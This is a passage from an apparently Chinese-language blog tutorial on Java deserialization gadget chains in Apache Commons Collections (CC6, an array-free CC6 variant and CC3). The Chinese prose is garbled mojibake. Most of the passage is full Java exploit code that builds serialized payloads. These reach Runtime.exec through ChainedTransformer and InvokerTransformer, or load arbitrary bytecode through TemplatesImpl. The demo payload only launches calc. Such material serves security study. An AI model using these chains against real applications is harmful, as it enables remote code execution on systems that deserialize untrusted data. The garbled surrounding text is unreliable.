class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; ser_map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        ser_map.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, Transformer);</span><br><span class="line">        Serializ(ser_map);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯å¾ˆå¯æƒœï¼Œæˆ‘ä»¬åœ¨æ‰§è¡Œæ—¶ä¼šå‘ç°å…¶åœ¨ååºåˆ—å‰çš„ser_map.putå¼¹å‡ºäº†è®¡ç®—æœºï¼Œä½†æ˜¯ååºåˆ—åŒ–æ—¶å´ä¸ä¼šè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚åŒæ ·çš„æˆ‘ä»¬ä¸€ä¸ªæ–­ç‚¹æ¥è°ƒè¯•<br><img src="/2024/09/25/CC%E9%93%BE/CC6_4.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼šå‘ç°å…¶åœ¨lazyMapé‡Œæ‰¾åˆ°äº†keykeyè¿™ä¸ªkeyï¼Œå¾ˆå¥‡æ€ªæ˜æ˜æ²¡æœ‰å®šä¹‰è¿™ä¸ªkeyå´èƒ½æ‰¾åˆ°è¿™ä¸ªkey<br>è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨ä½¿ç”¨ser_map.putæ˜¯ä¹Ÿè§¦å‘äº†å¦‚ä¸‹ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><br>è¿™å°±å¯¼è‡´äº†keykeyè¢«å†™å…¥åˆ°lazyMapé‡Œï¼Œè§£å†³æ–¹æ³•ä¹Ÿç®€å•ï¼Œç›´æ¥ä½¿ç”¨lazyMap.remove(â€œkeykeyâ€)<br>è¿™æ ·å³å¯ï¼Œ<br>è€Œåœ¨ååºåˆ—åŒ–å‰å°±æ‰§è¡Œå‘½ä»¤æˆ‘ä»¬å¯ä»¥å…ˆç»™ChainedTransformerä¼ å…¥ä¸€ä¸ªå‡çš„Transformæ•°ç»„ç„¶ååœ¨ser_map.putåå†é€šè¿‡åå°„ä¼ å…¥ä¸€ä¸ªçœŸçš„Transformæ•°ç»„ã€‚expå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; ser_map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        ser_map.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, Transformer);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        Serializ(ser_map);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="CC6æ”¹é€ æ— éœ€æ•°ç»„"><a href="#CC6æ”¹é€ æ— éœ€æ•°ç»„" class="headerlink" title="CC6æ”¹é€ æ— éœ€æ•°ç»„"></a>CC6æ”¹é€ æ— éœ€æ•°ç»„</h2><p>æˆ‘ä»¬è¿˜å¯ä»¥æ”¹é€ ä¸€ä¸‹è¿™ä¸ªCC6çš„å‘½ä»¤æ‰§è¡Œæ–¹æ³•è®©å…¶æ— éœ€ä½¿ç”¨æ•°ç»„å³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>æƒ³è¦ä¸ä½¿ç”¨æ•°ç»„æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå°±éœ€è¦ä½¿ç”¨åŠ è½½å­—èŠ‚ç çš„æ–¹å¼æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚<br><img src="/2024/09/25/CC%E9%93%BE/CC6_.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC6_6.png" class="" title="alt text"><br>æˆ‘ä»¬æŸ¥çœ‹å…¶è°ƒç”¨é“¾ä¼šå‘ç°æˆ‘ä»¬å¯ä»¥æ§åˆ¶transform(Obj)çš„å‚æ•°Objï¼Œå³æˆ‘ä»¬åªè¦ä¼ å…¥templatesï¼Œæ–¹å¼çš„æ–¹æ³•ä¸ºnewTransformè¿™æ ·å°±å¯ä»¥é€šè¿‡åå°„è°ƒç”¨templates.newTransformæ¥ç›´æ¥åŠ è½½å­—èŠ‚ç æ¥å‘½ä»¤æ‰§è¡Œï¼Œåªè¦æ˜¯Objå¯æ§çš„ccé“¾æˆ‘ä»¬éƒ½å¯ä»¥é€šè¿‡åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•æ¥ç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚ä»£ç å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_noArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);<span class="comment">//å‘keyä¼ å…¥å‚æ•°templatesä½¿å¾—å¯ä»¥ä¸ä½¿ç”¨æ•°ç»„</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; ser_map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        ser_map.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Field iMethodName=transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iMethodName.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        Serializ(ser_map);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>å­¦è¿™ä¸ªé“¾çš„ç›®çš„å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯è¿™ä¸ªé“¾ç»™å‡ºäº†ç¬¬äºŒç§å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å°±æ˜¯é€šè¿‡ç±»åŠ è½½çš„æ–¹æ³•æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>CC3çš„å‰åŠæ®µå…¶å®å’ŒCC1æ˜¯æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«çš„æ‰€ä»¥æˆ‘å…ˆåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹å¦‚ä½•é€šè¿‡ç±»åŠ è½½æ¥å‘½ä»¤æ‰§è¡Œ</p><p>è¿˜æ˜¯ä¸€æ ·å…ˆåˆ†æå‘½ä»¤æ‰§è¡Œçš„åŸå› </p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“åœ¨ä½¿ç”¨ClassLoaderåŠ è½½ç±»åå®ä¾‹åŒ–ä¼šå‘½ä»¤æ‰§è¡Œå…¶æ„é€ å‡½æ•°staticå—ç­‰ç­‰ã€‚è€ŒClassLoaderè°ƒç”¨çš„åº•å±‚å°±æ˜¯defineClassï¼Œä½†æ˜¯å…¶defineClasséƒ½ä¸æ˜¯publicç±»ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªé‡å†™äº†defineClassæ–¹æ³•å¹¶ä¸”ä¸ºpublicä¸”å¯åºåˆ—åŒ–çš„ç±»</p><img src="/2024/09/25/CC%E9%93%BE/CC3_2.png" class="" title="alt text"><img src="/2024/09/25/CC%E9%93%BE/CC3_1.png" class="" title="alt text"><p>æˆ‘ä»¬æŸ¥æ‰¾å¦‚ä¸Šæ ¼å¼defineClasså°±å¯ä»¥æ‰¾åˆ°åœ¨com.sun.org.apache.xalan.internal.xsltc.traxåŒ…ä¸‹çš„TemplatesImplå…¶é‡å†™äº†è°ƒç”¨äº†defineClass()</p><img src="/2024/09/25/CC%E9%93%BE/CC3_3.png" class="" title="alt text"><p>é€šè¿‡æŸ¥æ‰¾ç”¨æ³•æˆ‘ä»¬å¯ä»¥çœ‹åˆ°defineTransletClasses()è°ƒç”¨äº†defineClass()å†å¾€ä¸Šæ‰¾<br><img src="/2024/09/25/CC%E9%93%BE/CC3_7.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°getTransletInstance()ä¸‹è°ƒç”¨äº†defineTransletClasses()å¹¶ä¸”å…¶å°†æˆ‘ä»¬çš„ç±»ä½¿ç”¨äº†newInstance()è¿›è¡Œäº†å®ä¾‹åŒ–ã€‚<br><img src="/2024/09/25/CC%E9%93%BE/CC3_4.png" class="" title="alt text"><br>å†ç½‘ä¸Šæ‰¾å°±å¯ä»¥æ‰¾åˆ°publicçš„newTransformer()<br>æ‰¾åˆ°è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æˆ‘ä»¬CC1é“¾çš„å‰åŠéƒ¨åˆ†æ¥åå°„è°ƒç”¨è¿™ä¸ªnewTransformer<br>é‚£ä¹ˆæˆ‘ä»¬è¦åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œè‚¯å®šæ˜¯è¦ä½¿ç”¨åå°„æ¥è®²å…¶å†…éƒ¨å±æ€§è¿›è¡Œèµ‹å€¼ã€‚</p><p>æˆ‘ä»¬çœ‹getTransletInstance()æ–¹æ³•<br><img src="/2024/09/25/CC%E9%93%BE/CC3_7.png" class="" title="alt text"><br>ä¼šå‘ç°å…¶éœ€è¦<code>_name</code>æœ‰å€¼ï¼Œä¸”<code>_class</code>æ²¡å€¼æ‰ä¼šè¿›å…¥defineTransletClasses()<br><img src="/2024/09/25/CC%E9%93%BE/CC_8.png" class="" title="alt text"><br>æˆ‘ä»¬æŸ¥çœ‹defineTransletClasses()ä¼šå‘ç°æœ‰ä½¿ç”¨<code>_tfactory</code>é‚£ä¹ˆè¿™ä¸ªå€¼å°±éœ€è¦æœ‰å€¼ä¸ç„¶ä¼šæŠ¥é”™ï¼Œä¸”å…¶å°†å­—èŠ‚ç <code>_bytecodes[i]</code>ä¼ å…¥defineClasså¤„ç†<br>é‚£ä¹ˆæˆ‘ä»¬åªè¦å¾€_bytecodeså†…ä¼ å…¥æˆ‘ä»¬è¦åŠ è½½çš„æ¶æ„ç±»å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚<br><img src="/2024/09/25/CC%E9%93%BE/CC3_8.png" class="" title="alt text"><br>æˆ‘ä»¬æŸ¥çœ‹å„ç§å±æ€§ç±»å‹å¯ä»¥å‘ç°_bytecodesä¸ºäºŒç»´æ•°ç»„<br><img src="/2024/09/25/CC%E9%93%BE/CC3_9.png" class="" title="alt text"><br>ä½†æ˜¯_tfactoryä¸ºtransientå³å…¶æ— æ³•è¢«åºåˆ—åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬åˆè¦è°ƒç”¨è¿™ä¸ªï¼Œé‚£ä¹ˆå…¶ä¸€å®šå†ååºåˆ—æ—¶è¢«èµ‹äº†å€¼<br>æˆ‘ä»¬çœ‹readObject<br><img src="/2024/09/25/CC%E9%93%BE/CC3_10.png" class="" title="alt text"><br>ä¼šå‘ç°å…¶è¢«èµ‹å€¼ä¸ºnew TransformerFactoryImpl();<br>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ä¸€ä¸ªdemoæ¥æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œäº†å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_demo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        tmpl.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯å…¶è¿˜æ˜¯ä¼šæŠ¥é”™æ— 